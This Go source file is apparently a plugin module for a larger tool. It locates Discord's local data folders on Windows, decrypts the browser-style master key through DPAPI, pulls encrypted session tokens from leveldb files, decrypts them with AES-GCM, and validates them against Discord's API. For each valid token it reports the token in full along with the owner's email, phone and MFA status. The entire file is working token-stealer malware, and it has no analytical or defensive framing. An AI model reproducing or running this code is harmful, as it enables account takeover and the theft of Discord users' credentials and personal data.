package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"unsafe"
)

import "C"

var lastResult string

type DiscordPath struct {
	Name string
	Path string
}

type DiscordUser struct {
	ID            string `json:"id"`
	Username      string `json:"username"`
	Discriminator string `json:"discriminator"`
	Email         string `json:"email"`
	Phone         string `json:"phone"`
	Verified      bool   `json:"verified"`
	MfaEnabled    bool   `json:"mfa_enabled"`
}

var (
	crypt32            = syscall.NewLazyDLL("crypt32.dll")
	cryptUnprotectData = crypt32.NewProc("CryptUnprotectData")
)

type DataBlob struct {
	cbData uint32
	pbData *byte
}

func newBlob(d []byte) *DataBlob {
	if len(d) == 0 {
		return &DataBlob{}
	}
	return &DataBlob{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DataBlob) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:b.cbData])
	return d
}

func decryptDPAPI(data []byte) ([]byte, error) {
	var outblob DataBlob
	r, _, err := cryptUnprotectData.Call(uintptr(unsafe.Pointer(newBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer syscall.LocalFree(syscall.Handle(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func getMasterKey(path string) ([]byte, error) {
	localStatePath := filepath.Join(path, "Local State")
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	var localState struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}

	if err := json.Unmarshal(data, &localState); err != nil {
		return nil, err
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}

	encryptedKey = encryptedKey[5:]

	return decryptDPAPI(encryptedKey)
}

func decryptPassword(buff, masterKey []byte) (string, error) {
	if len(buff) < 15 {
		return "", fmt.Errorf("buffer too short")
	}

	if !bytes.HasPrefix(buff[:3], []byte("v10")) && !bytes.HasPrefix(buff[:3], []byte("v11")) {
		return "", fmt.Errorf("unsupported version")
	}

	iv := buff[3:15]
	payload := buff[15:]

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", err
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	if len(payload) < aesgcm.NonceSize() {
		return "", fmt.Errorf("payload too short")
	}

	plaintext, err := aesgcm.Open(nil, iv, payload, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func getTokens(path string) ([]string, error) {
	var tokens []string

	masterKey, err := getMasterKey(path)
	if err != nil {
		return nil, err
	}

	dbPattern := filepath.Join(path, "Local Storage", "leveldb", "*.ldb")
	matches, err := filepath.Glob(dbPattern)
	if err != nil {
		return nil, err
	}

	tokenRegex := regexp.MustCompile(`dQw4w9WgXcQ:[^"]*`)

	for _, dbPath := range matches {
		data, err := os.ReadFile(dbPath)
		if err != nil {
			continue
		}

		tokenMatches := tokenRegex.FindAllString(string(data), -1)
		for _, tokenMatch := range tokenMatches {

			encryptedToken := tokenMatch[12:]

			encryptedData, err := base64.StdEncoding.DecodeString(encryptedToken)
			if err != nil {
				continue
			}

			token, err := decryptPassword(encryptedData, masterKey)
			if err != nil {
				continue
			}

			tokens = append(tokens, token)
		}
	}

	return tokens, nil
}

func validateToken(token string) (*DiscordUser, error) {
	client := &http.Client{}
	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Authorization", token)
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("invalid token")
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var user DiscordUser
	if err := json.Unmarshal(body, &user); err != nil {
		return nil, err
	}

	return &user, nil
}

func extractDiscordTokens() string {
	var results []string

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return "Erro ao obter diretório home: " + err.Error()
	}

	discordPaths := []DiscordPath{
		{"Discord", filepath.Join(homeDir, "AppData", "Roaming", "discord")},
		{"Discord Canary", filepath.Join(homeDir, "AppData", "Roaming", "discordcanary")},
		{"Discord PTB", filepath.Join(homeDir, "AppData", "Roaming", "discordptb")},
	}

	foundTokens := make(map[string]bool)

	for _, discordPath := range discordPaths {
		if _, err := os.Stat(discordPath.Path); os.IsNotExist(err) {
			continue
		}

		results = append(results, fmt.Sprintf("\n[+] Verificando %s...", discordPath.Name))

		tokens, err := getTokens(discordPath.Path)
		if err != nil {
			results = append(results, fmt.Sprintf("[-] Erro ao extrair tokens de %s: %v", discordPath.Name, err))
			continue
		}

		if len(tokens) == 0 {
			results = append(results, fmt.Sprintf("[-] Nenhum token encontrado em %s", discordPath.Name))
			continue
		}

		for _, token := range tokens {
			if foundTokens[token] {
				continue
			}
			foundTokens[token] = true

			user, err := validateToken(token)
			if err != nil {
				results = append(results, fmt.Sprintf("[-] Token inválido encontrado: %s", token[:20]+"..."))
				continue
			}

			results = append(results, fmt.Sprintf("\n[+] TOKEN VÁLIDO ENCONTRADO:"))
			results = append(results, fmt.Sprintf("    Token: %s", token))
			results = append(results, fmt.Sprintf("    Usuário: %s#%s", user.Username, user.Discriminator))
			results = append(results, fmt.Sprintf("    ID: %s", user.ID))
			results = append(results, fmt.Sprintf("    Email: %s", user.Email))
			if user.Phone != "" {
				results = append(results, fmt.Sprintf("    Telefone: %s", user.Phone))
			}
			results = append(results, fmt.Sprintf("    Verificado: %v", user.Verified))
			results = append(results, fmt.Sprintf("    MFA Ativado: %v", user.MfaEnabled))
			results = append(results, fmt.Sprintf("    Origem: %s", discordPath.Name))
		}
	}

	if len(foundTokens) == 0 {
		return "\n[-] Nenhum token do Discord encontrado no sistema."
	}

	totalTokens := len(foundTokens)
	summary := fmt.Sprintf("\n[✓] Extração concluída! Total de tokens únicos encontrados: %d", totalTokens)
	results = append([]string{summary}, results...)

	return strings.Join(results, "\n")
}

func Execute(command *C.char) C.int {
	cmd := C.GoString(command)
	parts := strings.Fields(cmd)

	if len(parts) == 0 {
		lastResult = "Erro: Comando vazio"
		return 0
	}

	switch strings.ToLower(parts[0]) {
	case "extract":
		lastResult = extractDiscordTokens()
		return 1
	case "help":
		lastResult = "Comandos disponíveis:\n  extract - Extrai tokens do Discord do sistema"
		return 1
	default:
		lastResult = "Comando não reconhecido: " + parts[0] + "\nUse 'help' para ver comandos disponíveis"
		return 0
	}
}

func GetResult() *C.char {
	if lastResult == "" {
		return nil
	}

	return C.CString(lastResult)
}

func main() {}
